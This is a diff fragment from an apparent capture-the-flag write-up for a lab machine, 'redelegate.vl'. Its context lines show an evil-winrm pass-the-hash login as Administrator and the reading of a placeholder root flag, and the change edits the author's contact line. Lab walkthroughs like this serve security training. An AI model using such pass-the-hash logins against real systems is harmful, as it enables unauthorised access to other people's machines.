@@ -328,4 +328,4 @@ evil-winrm -u "Administrator" -H "a[...]99" -i "redelegate.vl"
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
 VL{FLAG}
 ```
-Nice !! if u have any questions you can dm me on [Instagram](https://instagram.com/eliott.la) or on discord at 'ethicxz.'
+Nice !! If you have any questions you can dm me on discord : 'ethicxz.'
